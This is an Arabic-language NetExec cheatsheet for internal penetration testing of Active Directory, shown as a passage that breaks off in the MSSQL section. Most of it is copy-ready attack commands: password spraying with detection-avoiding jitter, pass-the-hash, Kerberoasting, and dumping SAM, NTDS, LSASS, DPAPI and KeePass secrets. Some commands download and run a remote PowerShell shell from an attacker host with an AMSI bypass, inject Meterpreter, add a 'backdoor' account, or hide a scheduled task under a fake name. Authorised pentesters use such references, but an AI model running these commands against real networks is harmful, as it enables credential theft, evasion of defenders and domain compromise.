# 🔥 NetExec (nxc) — Cheatsheet الشامل للاختبار الاختراق الداخلي

> **NetExec** هو خلف CrackMapExec — أداة post-exploitation وأوتوماشن للشبكات الداخلية، تدعم SMB, LDAP, WinRM, MSSQL, RDP, SSH, WMI, FTP, VNC, NFS.  
> الأمر الأساسي: `nxc <protocol> <target(s)> [options]`

---

## 📦 التثبيت

```bash
pipx install git+https://github.com/Pennyw0rth/NetExec
# أو
sudo apt install netexec
```

---

## 🎯 صيغ الـ Target

```bash
nxc smb 192.168.1.10                        # IP واحد
nxc smb 192.168.1.0/24                      # CIDR
nxc smb 192.168.1.1-50                      # Range
nxc smb 192.168.1.10 10.0.0.5              # أكثر من target بمسافة
nxc smb ~/targets.txt                        # ملف
nxc smb DC.domain.local                      # Hostname
nxc smb 192.168.1.0/24 --generate-hosts-file hosts.txt  # يولد ملف hosts تلقائياً
```

> **💡 ليش مفيد؟** توليد ملف hosts يحل مشكلة DNS resolution عند استخدام Kerberos أو LDAP لاحقاً.

---

## 🔐 المصادقة — Authentication

### Password
```bash
nxc smb <ip> -u user -p 'Password123!'
nxc smb <ip> -u user -p 'Password123!' -d DOMAIN.LOCAL   # Domain auth
nxc smb <ip> -u user -p 'Password123!' --local-auth       # Local auth فقط
```

### NTLM Hash — Pass-the-Hash
```bash
nxc smb <ip> -u user -H 'NTHASH'
nxc smb <ip> -u user -H 'LM:NT'
nxc smb <ip> -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
```

> **💡 Pass-the-Hash** يشتغل بدون كلمة السر الأصلية — مفيد جداً بعد dump SAM/NTDS.  
> **⚠️ ملاحظة:** إذا واجهت `STATUS_NOT_SUPPORTED` يعني NTLM معطّل في الدومين، استخدم Kerberos.

### Kerberos — استخدام TGT موجود
```bash
# أولاً خذ TGT
getTGT.py 'DOMAIN/user:Password' -dc-ip <DC-IP>
export KRB5CCNAME=./user.ccache

# ثم استخدمه في nxc
nxc smb <ip> --use-kcache
nxc smb <ip> --use-kcache --kdcHost <DC-IP>   # لو فيه مشكلة DNS resolution
```

### Kerberos — مباشر بدون ccache
```bash
nxc smb <ip> -u user -p pass -k
nxc ldap <ip> -u user -p pass -k --kdcHost dc01.domain.local
```

> **💡 Kerberos أقل ظهوراً في الـ logs مقارنة بـ NTLM** — أفضل من ناحية OPSEC.

### Certificate — شهادة PFX
```bash
nxc smb <ip> -u user --pfx-cert user.pfx
nxc smb <ip> -u user --pfx-cert user.pfx --pfx-pass 'certpass'
nxc smb <ip> -u user --pem-cert user.pem --pem-key key.pem
```

> **💡 متى تستخدمه؟** بعد استغلال ADCS (ESC1-ESC8) وعندك certificate للمستخدم.

### Anonymous / Null / Guest
```bash
nxc smb <ip> -u '' -p ''                    # Null session
nxc smb <ip> -u 'anonymous' -p ''           # Anonymous
nxc smb <ip> -u 'guest' -p ''               # Guest account
```

> **💡 فائدة الـ Null session:** ممكن تجيب users, groups, password policy من DC قديم أو misconfigured.

### Multi-Domain Authentication
```bash
# ملف users.txt بالصيغة:
# DOMAIN1\user1
# DOMAIN2\user2
nxc smb <ip> -u users_with_domains.txt -p 'Password123!'
```

---

## ⚠️ مشاكل Kerberos الشائعة

```bash
# Clock skew error — فارق الوقت أكثر من 5 دقائق
sudo ntpdate <DC-IP>

# لو ntpdate ما شغّال
sudo timedatectl set-ntp false
sudo ntpdate -u <DC-IP>

# بعدها أعد تشغيل الأمر
nxc smb <ip> -u user -p pass -k
```

---

## 🔁 Password Spraying

```bash
# Spray كلمة سر واحدة على قائمة يوزرات
nxc smb 192.168.1.0/24 -u users.txt -p 'Summer2024' --continue-on-success

# Spray بدون bruteforce (user1→pass1, user2→pass2)
nxc smb <ip> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# متعدد passwords متعدد users (full matrix)
nxc smb <ip> -u users.txt -p passwords.txt

# Jitter لتفادي detection
nxc smb <ip> -u users.txt -p 'Pass123!' --jitter 2-5 --continue-on-success

# تحقق اسم المستخدم = كلمة السر (admin:admin)
nxc smb <ip> -u users.txt -p users.txt --no-bruteforce --continue-on-success

# حد فشل معين قبل الوقف
nxc smb <ip> -u users.txt -p 'Pass' --ufail-limit 3 --gfail-limit 50
```

> **💡 الفرق بين `--no-bruteforce` والعادي:**
> - العادي: كل يوزر مع كل باسورد (N×M محاولة)
> - `--no-bruteforce`: user1→pass1 فقط، user2→pass2 فقط (N محاولة)
>
> **⚠️ خطر lockout:** راقب password policy قبل الـ spray بـ `--pass-pol`.

---

## 🌐 SMB — الأساس والـ Backbone

### استعلام أساسي (بدون credentials)
```bash
nxc smb 192.168.1.0/24                      # يعطيك OS, Hostname, Domain, Signing
nxc smb <ip> --gen-relay-list relay.txt     # يحدد الأجهزة التي SMB signing معطّل فيها
```

> **💡 `--gen-relay-list`:** الخطوة الأولى قبل هجوم NTLM Relay — يجمع كل الـ targets القابلة للـ relay.

### Shares
```bash
nxc smb <ip> -u user -p pass --shares
nxc smb <ip> -u '' -p '' --shares                          # Null session
nxc smb <ip> -u user -p pass --shares --filter-shares READ  # فلتر readable فقط
nxc smb <ip> -u user -p pass --shares --filter-shares WRITE # فلتر writable فقط
nxc smb 192.168.1.0/24 -u user -p pass --shares READ,WRITE  # Subnet كامل
```

### Spider — استكشاف الملفات
```bash
# قائمة الملفات فقط
nxc smb <ip> -u user -p pass -M spider_plus

# تحميل كل الملفات المتاحة
nxc smb <ip> -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=/tmp/loot

# استثناء shares معينة
nxc smb <ip> -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_FILTER=c$,ipc$,admin$,netlogon,sysvol

# Spider تقليدي بـ pattern
nxc smb <ip> -u user -p pass --spider SHARENAME --pattern txt
nxc smb <ip> -u user -p pass --spider SHARENAME --regex password
nxc smb <ip> -u user -p pass --spider SHARENAME --content --regex "password|secret|credentials"
nxc smb <ip> -u user -p pass --spider C\$ --depth 3 --only-files
```

> **💡 `spider_plus` مع `DOWNLOAD_FLAG`:** يحمّل كل شيء readable — مفيد جداً للبحث عن credentials في scripts, config files, XML policies.

### نقل الملفات
```bash
# رفع ملف
nxc smb <ip> -u user -p pass --put-file /local/file.txt '\\Windows\\Temp\\file.txt'

# تحميل ملف
nxc smb <ip> -u user -p pass --get-file '\\Windows\\Temp\\file.txt' /local/output.txt

# تحميل ملفات متعددة من hosts مختلفين (append hostname)
nxc smb 192.168.1.0/24 -u user -p pass --get-file '\\Windows\\Temp\\output.txt' output.txt --append-host
```

### Enumeration
```bash
nxc smb <ip> -u user -p pass --users               # Domain users
nxc smb <ip> -u user -p pass --users-export users.txt
nxc smb <ip> -u user -p pass --groups              # Domain groups
nxc smb <ip> -u user -p pass --computers           # Domain computers
nxc smb <ip> -u user -p pass --local-groups        # Local groups
nxc smb <ip> -u user -p pass --local-groups Administrators  # أعضاء مجموعة معينة
nxc smb <ip> -u user -p pass --pass-pol            # Password policy (مهم قبل Spray)
nxc smb <ip> -u user -p pass --loggedon-users      # من مسجل دخول الآن
nxc smb <ip> -u user -p pass --loggedon-users targetuser  # صيد مستخدم معين
nxc smb <ip> -u user -p pass --qwinsta            # Interactive sessions (RDP/local)
nxc smb <ip> -u user -p pass --sessions            # Active SMB sessions
nxc smb <ip> -u user -p pass --rid-brute           # Enumerate users بـ RID brute
nxc smb <ip> -u user -p pass --rid-brute 10000     # حتى RID رقم 10000
nxc smb <ip> -u user -p pass --disks               # الأقراص المتصلة
nxc smb <ip> -u user -p pass --interfaces          # Network interfaces (هام للـ pivoting)
nxc smb <ip> -u user -p pass --tasklist            # العمليات الجارية
nxc smb <ip> -u user -p pass --tasklist keepass.exe # بحث عن process معين
nxc smb <ip> -u user -p pass --taskkill PID        # إيقاف process
nxc smb <ip> -u user -p pass --reg-sessions        # Users loaded in registry
```

> **💡 `--loggedon-users` vs `--qwinsta`:**
> - `--loggedon-users` → يعرض كل users لهم token على الجهاز (network logins مشمولة)
> - `--qwinsta` → Interactive sessions فقط (RDP أو local console) — هذا اللي تحتاجه لـ `schtask_as`

### تنفيذ الأوامر
```bash
nxc smb <ip> -u admin -p pass -x 'whoami'                     # CMD
nxc smb <ip> -u admin -p pass -X '$PSVersionTable'            # PowerShell
nxc smb <ip> -u admin -p pass -X 'whoami' --no-output         # بدون انتظار output (reverse shells)
nxc smb <ip> -u admin -p pass -x 'whoami' --exec-method smbexec
nxc smb <ip> -u admin -p pass -x 'whoami' --exec-method wmiexec
nxc smb <ip> -u admin -p pass -x 'whoami' --exec-method atexec
nxc smb <ip> -u admin -p pass -x 'whoami' --exec-method mmcexec

# تجاوز AMSI لـ PowerShell
nxc smb <ip> -u admin -p pass -X 'IEX(New-Object Net.WebClient).DownloadString("http://attacker/shell.ps1")' --amsi-bypass /path/to/bypass.txt
```

> **💡 فرق طرق التنفيذ:**
> - `wmiexec` (default): أهدأ، عبر WMI — الأفضل OPSEC
> - `smbexec`: ينشئ service مؤقت — يترك أثر في event logs
> - `atexec`: Scheduled Task — يترك أثر في Task Scheduler
> - `mmcexec`: عبر MMC — نادر الاستخدام لكن أحياناً يتجاوز الـ AV

---

## 🗄️ LDAP — Active Directory استعلام

### معلومات المستخدمين
```bash
nxc ldap <ip> -u user -p pass --users
nxc ldap <ip> -u user -p pass --users-export users.txt
nxc ldap <ip> -u user -p pass --active-users       # الحسابات الفعّالة فقط
nxc ldap <ip> -u user -p pass --admin-count        # الحسابات الادمن (adminCount=1)
nxc ldap <ip> -u user -p pass --password-not-required  # حسابات بدون password requirement
nxc ldap <ip> -u user -p pass -M get-desc-users    # وصف المستخدمين (كثيراً فيها passwords!)
```

> **💡 `get-desc-users`:** في كثير من البيئات يضع الـ sysadmin كلمة السر المؤقتة في وصف الحساب.  
> استخدم `-o FILTER=pass` للبحث عن كلمة معينة في الوصف.

### المجموعات والأجهزة
```bash
nxc ldap <ip> -u user -p pass --groups
nxc ldap <ip> -u user -p pass --groups "Domain Admins"   # أعضاء مجموعة معينة
nxc ldap <ip> -u user -p pass --computers
nxc ldap <ip> -u user -p pass -M groupmembership -o USER='targetuser'  # مجموعات مستخدم معين
nxc ldap <ip> -u user -p pass -M group-mem -o GROUP='Domain Admins'    # أعضاء مجموعة معينة
```

### Domain Info
```bash
nxc ldap <ip> -u user -p pass --get-sid            # Domain SID
nxc ldap <ip> -u user -p pass --dc-list            # Domain Controllers + Trust info
nxc ldap <ip> -u user -p pass --pso                # Fine-Grained Password Policies
nxc ldap <ip> -u user -p pass -M enum_trusts       # Domain Trusts
nxc ldap <ip> -u user -p pass -M maq               # MachineAccountQuota (عدد الأجهزة للإضافة)
nxc ldap <ip> -u user -p pass -M get-network       # Subnets (مفيد جداً لاكتشاف شبكات مخفية)
nxc ldap <ip> -u user -p pass -M get-network -o ONLY_HOSTS=true
nxc ldap <ip> -u user -p pass -M get-network -o ALL=true
```

> **💡 `--dc-list`:** يكشف كل الـ Domain Controllers مع الـ Trust relationships — أساسي لفهم بنية الـ AD.  
> **💡 `maq`:** لو القيمة > 0 تقدر تضيف computer account بدون صلاحيات admin (مفيد لـ RBCD attack).

### Kerberos Attacks
```bash
# ASREPRoasting — حسابات بدون pre-auth
nxc ldap <ip> -u user -p pass --asreproast output.txt
nxc ldap <ip> -u users.txt -p '' --asreproast output.txt  # بدون credentials
nxc ldap <ip> -u user -p pass --asreproast output.txt --kdcHost <DC-IP>

# Kerberoasting — حسابات بـ SPN
rm -rf ~/.nxc/logs/
rm -rf ~/.nxc/*.db
nxc ldap <ip> -u user -p pass --kerberoasting output.txt
nxc ldap <ip> -u user -p pass --kerberoasting output.txt --kdcHost <DC-IP>

# Kerberoasting عبر AS-REP Roastable account
nxc ldap <ip> -u asrep_user -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt

# كسر الهاش
hashcat -m18200 asrep_hashes.txt wordlist.txt    # ASREPRoast
hashcat -m13100 kerb_hashes.txt wordlist.txt     # Kerberoast
```

> **💡 الفرق:**
> - **ASREPRoast**: لا تحتاج credentials، الحساب المستهدف ما عنده `pre-auth` مفعّل
> - **Kerberoast**: تحتاج credentials، الحساب المستهدف عنده `SPN`

### Delegation Enumeration
```bash
nxc ldap <ip> -u user -p pass --trusted-for-delegation    # Unconstrained delegation
nxc ldap <ip> -u user -p pass --find-delegation           # كل أنواع الـ delegation
```

> **💡 Unconstrained Delegation:** أي مستخدم يتصل بالجهاز هذا يُخزّن TGT في الذاكرة — مفيد جداً مع هجمات Coerce (PrinterBug, PetitPotam).

### ACL / DACL Analysis
```bash
# قراءة كل ACEs لحساب معين
nxc ldap <DC-IP> -u user -p pass -M daclread -o TARGET=Administrator ACTION=read

# فلتر حسب principal معين (مين عنده صلاحيات على الـ target)
nxc ldap <DC-IP> -u user -p pass -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=compromised_user

# البحث عن حسابات عندها DCSync rights
nxc ldap <DC-IP> -u user -p pass -M daclread -o TARGET_DN="DC=domain,DC=LOCAL" ACTION=read RIGHTS=DCSync

# البحث عن Denied ACEs
nxc ldap <DC-IP> -u user -p pass -M daclread -o TARGET=Administrator ACTION=read ACE_TYPE=denied

# Backup الـ DACLs لأكثر من target
nxc ldap <DC-IP> -u user -p pass -M daclread -o TARGET=targets.txt ACTION=backup
```

> **💡 DACL Abuse:** عندما تجد مستخدماً compromised عنده `ForceChangePassword`, `GenericWrite`, `WriteDACL`, أو `DCSync rights` — هذه مسارات مباشرة للـ privilege escalation.

### استعلامات LDAP يدوية
```bash
# استعلام حر مثل ldapsearch
nxc ldap <ip> -u user -p pass --query "(sAMAccountName=Administrator)" ""
nxc ldap <ip> -u user -p pass --query "(sAMAccountName=*)" "sAMAccountName mail description"
nxc ldap <ip> -u user -p pass --query "(objectClass=computer)" "name operatingSystem"
nxc ldap <ip> -u user -p pass --query "(adminCount=1)" "sAMAccountName"
nxc ldap <ip> -u user -p pass --query "(servicePrincipalName=*)" "sAMAccountName servicePrincipalName"
nxc ldap <ip> -u user -p pass --query "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" "sAMAccountName"  # DONT_REQUIRE_PREAUTH

# مع base-dn مخصص
nxc ldap <ip> -u user -p pass --query "(name=jon.snow)" "msDS-AllowedToDelegateTo cn" --base-dn "DC=domain,DC=local"
```

### BloodHound Collection
```bash
nxc ldap <ip> -u celia.almeda  -H e728ecbadfb02f51ce8eed753f3ff3fd --bloodhound --collection All --dns-server 10.10.91.140
nxc ldap <ip> -u user -p pass --bloodhound --collection DCOnly   # أسرع، DC فقط
nxc ldap <ip> -u user -p pass --bloodhound --collection Group,ACL,Trusts
```

> **💡 `DCOnly`:** أسرع بكثير وأقل ضجيجاً في الـ logs — يكفي لتحليل مسارات الـ privilege escalation في معظم الحالات.

### LAPS — Local Admin Password Solution
```bash
nxc ldap <ip> -u user -p pass -M laps          # يقرأ LAPS passwords لو عندك صلاحية
nxc smb <ip> -u user-can-read-laps -p pass --laps          # استخدام LAPS password مباشرة لـ SMB
nxc smb <ip> -u user-can-read-laps -p pass --laps AdminName  # لو اسم الـ admin مش "administrator"
```

> **💡 LAPS:** يُخزّن كلمة سر الـ local admin في الـ AD attribute `ms-Mcs-AdmPwd`. أي حساب عنده صلاحية `Read` على هذا الـ attribute يقدر يقرأها.

### gMSA — Group Managed Service Accounts
```bash
nxc ldap <ip> -u user -p pass --gmsa          # يسترجع الـ NTLM hash لحساب gMSA
nxc ldap <ip> -u user -p pass --gmsa-convert-id <id>       # تحويل ID
nxc ldap <ip> -u user -p pass --gmsa-decrypt-lsa '<lsa_value>'  # فك تشفير من LSA
```

### Pre2K Computer Accounts
```bash
nxc ldap <ip> -u user -p pass -M pre2k
# يبحث عن computer accounts قديمة بدون كلمة سر (pre-Windows 2000)
# يحاول يسترجع TGT ويحفظه في ~/.nxc/modules/pre2k/ccache/
```

### ADCS — Certificate Services
```bash
nxc ldap <ip> -u user -p pass -M adcs               # يعدد كل PKI servers
nxc ldap <ip> -u user -p pass -M adcs -o SERVER=CA01  # certificates في PKI معين
```

### Domain Trusts Abuse — Raisechild
```bash
# هجوم Inter-forest trust: child → parent أو parent → child
nxc ldap <DC-IP> -u user -p pass -M raisechild
nxc ldap <DC-IP> -u user -p pass -M raisechild -o USER=test123 USER_ID=1111
nxc ldap <DC-IP> -u user -p pass -M raisechild -o ETYPE=aes256
nxc ldap <DC-IP> -u user -p pass -M raisechild -o RID=519   # Enterprise Admins
# بعدها:
export KRB5CCNAME=Administrator.ccache
nxc ldap <parent-DC> --use-kcache
```

> **💡 Raisechild:** يستغل الـ intra-forest trust لصياغة Golden Ticket يتضمن extra SID من الـ parent domain — مسار مباشر لـ Enterprise Admin.

### Entra ID (Azure AD) Sync
```bash
nxc ldap <ip> -u user -p pass -M entra-id    # يجد الـ MSOL sync account
# بعد إيجاد الـ MSOL account، له DCSync rights بشكل افتراضي
nxc smb <DC-IP> -u 'MSOL_xxxxxxxx' -p 'FoundPassword' --ntds
```

### SCCM / MECM
```bash
nxc ldap <ip> -u user -p pass -M sccm -o REC_RESOLVE=TRUE  # LDAP enumeration لـ SCCM
nxc smb <ip> -u user -p pass -M sccm-recon6               # Registry-based recon على SCCM server
```

### WhoAmI & User Context
```bash
nxc ldap <ip> -u user -p pass -M whoami      # معلومات الحساب الحالي + مجموعاته
```

---

## 💉 Credential Dumping

### SAM — Local Users
```bash
nxc smb <ip> -u admin -p pass --sam
nxc smb <ip> -u admin -p pass --sam secdump   # طريقة بديلة لو الأولى فشلت
nxc smb 192.168.1.0/24 -u admin -p pass --sam  # على subnet كامل
```

> **💡 SAM:** يحتوي على NTLM hashes للـ local accounts — استخدمها لـ Pass-the-Hash على أجهزة أخرى بنفس كلمة السر.

### LSA Secrets — خزينة كلمات السر
```bash
nxc smb <ip> -u admin -p pass --lsa
nxc smb <ip> -u admin -p pass --lsa secdump
```

> **💡 LSA Secrets تحتوي على:**
> - كلمات سر الـ Service Accounts
> - Cached domain credentials  
> - Machine account hash  
> - DPAPI_SYSTEM key  
> - كلمات سر AutoLogon

### NTDS.dit — Domain Controller الكنز الأكبر
```bash
nxc smb <DC-IP> -u admin -p pass --ntds                    # drsuapi (DCSync) — الأسرع
nxc smb <DC-IP> -u admin -p pass --ntds vss                # Volume Shadow Copy
nxc smb <DC-IP> -u admin -p pass --ntds --enabled          # الحسابات الفعّالة فقط
nxc smb <DC-IP> -u admin -p pass --ntds --user Administrator  # مستخدم واحد فقط
nxc smb <DC-IP> -u admin -p pass --ntds --user 'NETBIOS/Administrator'  # Multi-domain

# طرق بديلة
nxc smb <DC-IP> -u admin -p pass -M ntdsutil
nxc smb <DC-IP> -u admin -p pass -M ntds-dump-raw -o TARGET=NTDS  # Raw disk access
```

> **💡 بعد NTDS dump:** عندك كل هاشات الدومين — `krbtgt` hash تستطيع منه صنع Golden Ticket، وكل هاشات الـ Domain Admins تقدر تستخدمها لـ Pass-the-Hash.

### LSASS Dump — Credentials من الذاكرة
```bash
nxc smb <ip> -u admin -p pass -M lsassy          # الأفضل والأشهر
nxc smb <ip> -u admin -p pass -M nanodump        # أكثر تخفياً من الـ AV
nxc smb <ip> -u admin -p pass -M procdump        # باستخدام procdump
nxc smb <ip> -u admin -p pass -M handlekatz      # handle duplication method
nxc smb <ip> -u admin -p pass -M lsassy -o METHOD=comsvcs_stealth  # أهدأ طريقة
```

> **💡 متى تستخدم كل واحدة؟**
> - `lsassy`: الافتراضي، سريع وموثوق
> - `nanodump`: لو AV/EDR يوقف الـ lsassy
> - `handlekatz`: يتجنب فتح handle مباشر على LSASS

### DPAPI — كلمات السر المشفّرة
```bash
nxc smb <ip> -u admin -p pass --dpapi                      # كل الـ DPAPI secrets
nxc smb <ip> -u admin -p pass --dpapi cookies              # + Cookies المتصفح
nxc smb <ip> -u admin -p pass --dpapi nosystem             # بدون SYSTEM secrets (أقل إنذاراً)
nxc smb <ip> -u admin -p pass --local-auth --dpapi nosystem  # Local account
nxc winrm <ip> -u user -p pass --dpapi                     # عبر WinRM (بدون admin!)
```

> **💡 DPAPI يحتوي على:** كلمات سر Chrome/Firefox/Edge، Credential Manager، RDP passwords، Wi-Fi PSKs، Outlook passwords.

### BackupOperator Privilege — بدون Admin
```bash
nxc smb <ip> -u backupuser -p pass -M backup_operator
# لو المستخدم في Backup Operators group يقدر يقرأ SAM/SYSTEM/NTDS.dit
```

> **💡 نقطة مهمة:** `Backup Operators` مجموعة خطيرة جداً — أعضاؤها يقدرون dump أي ملف حتى NTDS.dit بدون أن يكونوا Domain Admins.

### أدوات التطبيقات المخزّنة
```bash
nxc smb <ip> -u admin -p pass -M mremoteng      # mRemoteNG connections config
nxc smb <ip> -u admin -p pass -M winscp         # WinSCP saved sessions
nxc smb <ip> -u admin -p pass -M putty          # PuTTY private keys + saved sessions
nxc smb <ip> -u admin -p pass -M vnc            # VNC passwords من registry
nxc smb <ip> -u admin -p pass -M wifi           # Wi-Fi PSKs
nxc smb <ip> -u admin -p pass -M veeam          # Veeam Backup credentials
nxc smb <ip> -u admin -p pass -M lsassy         # LSASS dump
nxc smb <ip> -u admin -p pass -M keepass_discover  # اكتشاف KeePass
nxc smb <ip> -u admin -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH="<path>"  # سرقة Master Password
nxc smb <ip> -u admin -p pass -M teams_localdb  # Microsoft Teams cookies
nxc smb <ip> -u admin -p pass -M wam            # Azure/M365 Token Broker Cache tokens
```

> **💡 `teams_localdb`:** Teams tokens تتيح لك الوصول لـ Teams بشكل كامل — رسائل، ملفات، مجموعات — حتى بدون كلمة السر.

### PowerShell History & Artifacts
```bash
nxc smb <ip> -u admin -p pass -M powershell_history   # تاريخ الأوامر في ConsoleHost_history.txt
nxc smb <ip> -u admin -p pass -M notepad              # Notepad unsaved documents
nxc smb <ip> -u admin -p pass -M notepad++            # Notepad++ unsaved documents
nxc smb <ip> -u admin -p pass -M eventlog_creds       # Event ID 4688 + Sysmon logs للـ credentials
nxc smb <ip> -u admin -p pass -M rdcman               # Remote Desktop Connection Manager credentials
```

> **💡 `powershell_history`:** أوامر مثل `net use \\server /user:domain\admin P@ssword` تُسجّل هنا. كنز حقيقي في بيئات الـ sysadmins.

### GPP Passwords — Group Policy Preferences
```bash
nxc smb <DC-IP> -u '' -p '' -M gpp_password       # كلمات سر مشفّرة في SYSVOL
nxc smb <DC-IP> -u '' -p '' -M gpp_autologin      # AutoLogon credentials
```

> **💡 GPP Passwords:** كانت Microsoft تشفّر passwords في SYSVOL بـ AES-256 لكن نشرت الـ key علناً! أي domain user يقدر يقرأ SYSVOL ويفك التشفير.

---

## 🔄 Lateral Movement & Post-Exploitation

### Delegation Abuse — RBCD
```bash
# RBCD: لو عندك msDS-AllowedToActOnBehalfOfOtherIdentity على الجهاز المستهدف
nxc smb <ip> -u controlled_user -p pass --delegate Administrator

# S4U2Self: لو عندك computer account
nxc smb <ip> -u 'COMPUTER$' -H <hash> --delegate Administrator --self
```

> **💡 RBCD:** يسمح لك بانتحال هوية أي مستخدم (بما فيهم Domain Admin) للوصول للجهاز المستهدف.

### Impersonate Logged-On Users
```bash
# أولاً: ابحث عن Interactive sessions
nxc smb <ip> -u admin -p pass --qwinsta

# ثانياً: نفّذ أوامر بهويتهم
nxc smb <ip> -u admin -p pass -M schtask_as -o USER=<target_user> CMD='whoami'
nxc smb <ip> -u admin -p pass -M schtask_as -o USER=<target_user> CMD='net user backdoor P@ss123! /add'

# مع binary upload
nxc smb <ip> -u admin -p pass -M schtask_as -o USER=<target_user> CMD='shell.exe' BINARY=/local/shell.exe

# مع إخفاء الـ scheduled task
nxc smb <ip> -u admin -p pass -M schtask_as -o USER=<target_user> CMD='whoami' TASK='Windows Update Service' FILE='update.log' LOCATION='\\Windows\\Tasks\\'
```

> **💡 `schtask_as`:** تقدر تضيف user للـ Domain Admins بهوية DA كانت عنده session:
> ```
> CMD="powershell.exe \"Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members user}\""
> ```

### Process Injection
```bash
# استخدام process injection لتنفيذ بهوية مستخدم آخر
nxc smb <ip> -u admin -p pass -M pi -o PID=<target_pid> EXEC='whoami'
```

### Token Abuse
```bash
# listing tokens available
nxc smb <ip> -u '' -p '' -M impersonate
# استخدام token معين
nxc smb <ip> -u '' -p '' -M impersonate -o Token=1 EXEC='whoami'
```

### Password/Hash Change
```bash
# تغيير كلمة السر لـ current user
nxc smb <ip> -u user -p pass -M change-password -o NEWPASS=NewPassword123!
nxc smb <ip> -u user -p pass -M change-password -o NEWNTHASH=<nt_hash>

# تغيير كلمة سر مستخدم آخر (ForceChangePassword أو admin privs)
nxc smb <ip> -u admin -p pass -M change-password -o USER=TargetUser NEWPASS=NewPassword123!
nxc smb <ip> -u admin -p pass -M change-password -o USER=TargetUser NEWHASH=<nt_hash>
```

### Shellcode/Agent Delivery
```bash
# Empire Agent
nxc smb 192.168.1.0/24 -u admin -p pass -M empire_exec -o LISTENER=http_listener

# Metasploit Meterpreter
nxc smb 192.168.1.0/24 -u admin -p pass -M met_inject -o SRVHOST=<attacker_ip> SRVPORT=8443 RAND=<random> SSL=https
```

### Add Computer Account
```bash
nxc smb <ip> -u user -p pass -M add-computer -o NAME='FAKEMACHINE$' PASSWORD='P@ssword123!'
# مفيد لـ RBCD attack أو machine account quota abuse
```

---

## 🔒 SMB Security Checks

```bash
nxc smb 192.168.1.0/24 --gen-relay-list unsigned_hosts.txt  # أجهزة بدون SMB signing
nxc smb <ip> -u user -p pass -M spooler       # هل Spooler service شغّال؟ (PrinterBug)
nxc smb <ip> -u user -p pass -M webdav        # هل WebDAV شغّال؟ (NTLM relay attack vector)
nxc smb <ip> -u user -p pass -M ntlmv1        # هل NTLMv1 مسموح؟ (قابل للـ downgrade)
nxc smb <ip> -u user -p pass -M enum_av       # Antivirus/EDR الموجود
nxc smb <ip> -u user -p pass -M bitlocker     # BitLocker status
nxc smb <ip> -u user -p pass -M lockscreendoors  # Backdoored accessibility executables
nxc smb <ip> -u user -p pass -M security-questions  # Local security questions
```

> **💡 `ntlmv1`:** إذا `LmCompatibilityLevel < 3` تقدر تصنع NetNTLMv1 hashes قابلة للـ crack بسهولة أكبر. أفضل هجوم هو NTLM relay لـ LDAPS.

---

## 🛡️ Vulnerability Scanning

```bash
nxc smb <ip> -u '' -p '' -M zerologon        # CVE-2020-1472
nxc smb <ip> -u '' -p '' -M ms17-010         # EternalBlue
nxc smb <ip> -u '' -p '' -M smbghost         # CVE-2020-0796
nxc smb <ip> -u '' -p '' -M printnightmare   # CVE-2021-1675
nxc smb <ip> -u user -p pass -M nopac        # CVE-2021-42278/42287 (يحتاج credentials)
nxc smb <ip> -u user -p pass -M ntlm_reflection  # CVE-2025-33073 (يحتاج credentials)

# فحص Coerce vulnerabilities (PetitPotam, PrinterBug, DFSCoerce, etc.)
nxc smb <ip> -u '' -p '' -M coerce_plus
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<attacker_ip>
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<attacker_ip> ALWAYS=true
nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam  # هجوم محدد

# فحص أكثر من vulnerability بنفس الوقت
nxc smb <ip> -u '' -p '' -M zerologon -M printnightmare -M smbghost
```

> **💡 `coerce_plus`:** يجمع PetitPotam + PrinterBug + DFSCoerce + MSEven + ShadowCoerce في أمر واحد. إذا وجد الـ listener يستطيع capture NTLM hash أو relay للـ LDAP.

---

## 🗃️ MSSQL

### المصادقة
```bash
nxc mssql <ip> -u user -p pass                    # Windows auth (domain)
nxc mssql <ip> -u user -p pass -d DOMAIN          # تحديد الدومين
nxc mssql <ip> -u sa -p pass --local-auth          # SQL auth (local)
nxc mssql <ip> -u user -p pass --port 1434         # Port مخصص
```

### الاستعلامات
```bash
nxc mssql <ip> -u user -p pass -q 'SELECT name FROM master.dbo.sysdatabases;'
nxc mssql <ip> -u user -p pass -q 'SELECT @@version'
nxc mssql <ip> -u user -p pass -q 'SELECT name FROM master..syslogins'
nxc mssql <ip> -u user -p pass -q 'SELECT HAS_DBACCESS('"'"'dbname'"'"');'
nxc mssql <ip> -u user -p pass -q 'use dbname; select * from users;'
nxc mssql <ip> -u user -p pass --rid-brute         # Enumerate users بـ RID brute
```

### تنفيذ الأوامر
```bash
# تفعيل xp_cmdshell
nxc mssql <ip> -u user -p pass -M enable_cmdshell -o ACTION=enable

# تنفيذ أوامر
nxc mssql <ip> -u user -p pass -x 'whoami'

# إيقاف xp_cmdshell
nxc mssql <ip> -u user -p pass -M enable_cmdshell -o ACTION=disable
```

### Privilege Escalation
```bash
nxc mssql <ip> -u user -p pass -M mssql_priv                           # كشف إمكانية impersonation
nxc mssql <ip> -u user -p pass -M mssql_priv -o ACTION=privesc         # تفعيل الـ privesc
nxc mssql <ip> -u user -p pass -M mssql_priv -o ACTION=rollback        # إلغاء الـ privesc
```

> **💡 MSSQL Impersonation:** إذا المستخدم عنده `IMPERSONATE` permission على `sa` أو sysadmin آخر، يقدر يرتفع لـ sysadmin بشكل كامل.

### Linked Servers — الانتشار بين قواعد البيانات
```bash
# اكتشاف الـ linked servers
nxc mssql <ip> -u user -p pass -M enum_links

# تنفيذ استعلام على linked server
nxc mssql <ip> -u user -p pass -M exec_on_link -o LINKED_SERVER=BRAAVOS COMMAND='select @@servername'

# تفعيل xp_cmdshell على linked server
nxc mssql <ip> -u user -p pass -M link_enable_cmdshell -o LINKED_SERVER=BRAAVOS ACTION=enable

# تنفيذ أوامر على linked server
nxc mssql <ip> -u user -p pass -M link_xpcmd -o LINKED_SERVER=BRAAVOS CMD='whoami'

# إيقاف xp_cmdshell على linked server
